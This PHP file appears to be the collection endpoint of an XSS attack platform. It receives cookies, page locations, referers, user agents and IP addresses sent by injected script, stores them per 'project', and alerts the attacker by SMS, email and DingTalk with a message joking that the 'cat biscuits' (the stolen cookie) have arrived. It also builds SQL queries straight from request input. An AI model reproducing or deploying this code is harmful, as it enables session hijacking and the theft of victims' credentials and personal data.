<?php
/**
 * api.php 接口
 * ----------------------------------------------------------------
 * OldCMS,site:http://www.oldcms.com
 */
if (!defined('IN_OLDCMS')) {
    die('Access Denied');
}

$id = Val('id', 'GET');
if ($id) {
    $db = DBConnect();
    $project = $db->FirstRow("SELECT * FROM " . Tb('project') . " WHERE urlKey='{$id}'");
    if (empty($project)) {
        exit();
    }
    //用户提供的content
    $content = array();
    //待接收的key
    $keys = array();
    /* 模块 begin */
    $moduleIds = array();
    if (!empty($project['modules'])) {
        $moduleIds = json_decode($project['modules']);
    }
    if (!empty($moduleIds)) {
        $modulesStr = implode(',', $moduleIds);
        $modules = $db->Dataset("SELECT * FROM " . Tb('module') . " WHERE id IN ($modulesStr)");
        if (!empty($modules)) {
            foreach ($modules as $module) {
                if (!empty($module['keys'])) {
                    $keys = array_merge($keys, json_decode($module['keys']));
                }
            }
        }
    }
    /* 模块 end */
    foreach ($keys as $key) {
        $content[$key] = Val($key, 'REQUEST');
    }
    if (in_array('toplocation', $keys)) {
        $content['toplocation'] = !empty($content['toplocation']) ? $content['toplocation'] : $content['location'];
    }

    $judgeCookie = in_array('cookie', $keys) ? true : false;
    /* cookie hash */
    $cookieHash = md5($project['id'] . '_' . $content['cookie'] . '_' . $content['location'] . '_' . $content['toplocation']);
    $cookieExisted = $db->FirstValue("SELECT COUNT(*) FROM " . Tb('project_content') . " WHERE projectId='{$project['id']}' AND cookieHash='{$cookieHash}'");
    if (!$judgeCookie || $cookieExisted <= 0) {
        //服务器获取的content
        $serverContent = array();
        $serverContent['HTTP_REFERER'] = $_SERVER['HTTP_REFERER'];
        $referers = @parse_url($serverContent['HTTP_REFERER']);
        $domain = $referers['host'] ? $referers['host'] : '';
        $domain = StripStr($domain);
        $serverContent['HTTP_REFERER'] = StripStr($_SERVER['HTTP_REFERER']);
        $serverContent['HTTP_USER_AGENT'] = StripStr($_SERVER['HTTP_USER_AGENT']);
        $user_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        if ($user_ip == '') {
            $user_ip = $_SERVER['REMOTE_ADDR'];
        }
        $serverContent['REMOTE_ADDR'] = StripStr($user_ip);
        $values = array(
            'projectId' => $project['id'],
            'content' => JsonEncode($content),
            'serverContent' => JsonEncode($serverContent),
            'domain' => $domain,
            'cookieHash' => $cookieHash,
            'num' => 1,
            'addTime' => time()
        );
        //$db->AutoExecute(Tb('project_content'),$values);

        $judgeCookie = in_array('cookie', $keys) ? true : false;
        /* cookie hash */
        $Getcookie = $content['cookie'];


        $db->AutoExecute(Tb('project_content'), $values);
        //Getcookie在上面的变量里
        $uid = $project['userId'];
        $userInfo = $db->FirstRow("SELECT * FROM " . Tb('user') . " WHERE id={$uid}");
        $msg = explode("|", $userInfo['message']);
        if ($userInfo['phone'] && $msg[1] == 1) {
            SendSMS('13800138000', '123456', $userInfo['phone'], "尊敬的" . $userInfo['userName'] . "，您在" . URL_ROOT . " 预订的猫饼干，Cookie:{$Getcookie}已经到货！详情请登陆：" . URL_ROOT . " 查看！");
            //参数:发送的飞信号 飞信密码
        }

        //发送内容
        $sendStr = "尊敬的" . $userInfo['userName'] . "，您在" . URL_ROOT . " 预订的猫饼干<br>Cookie:{$Getcookie}<br>已经到货！<br>详情请登陆：" . URL_ROOT . " 查看。";
        if ($userInfo['email'] && $msg[0] == 1) {
            SendMail($userInfo['email'], URL_ROOT . "饼干商城", $sendStr);//Getcookie在上面的变量里
        }
        //钉钉通知
        if ($userInfo['dingding'] && $msg[2] == 1) {
            dingdingNotice($sendStr, $userInfo['dingding']);
        }

    } else {
        $db->Execute("UPDATE " . Tb('project_content') . " SET num=num+1,updateTime='" . time() . "' WHERE projectId='{$project['id']}' AND cookieHash='{$cookieHash}'");
    }

    header("Location: $_SERVER[HTTP_REFERER] ");
}
?>
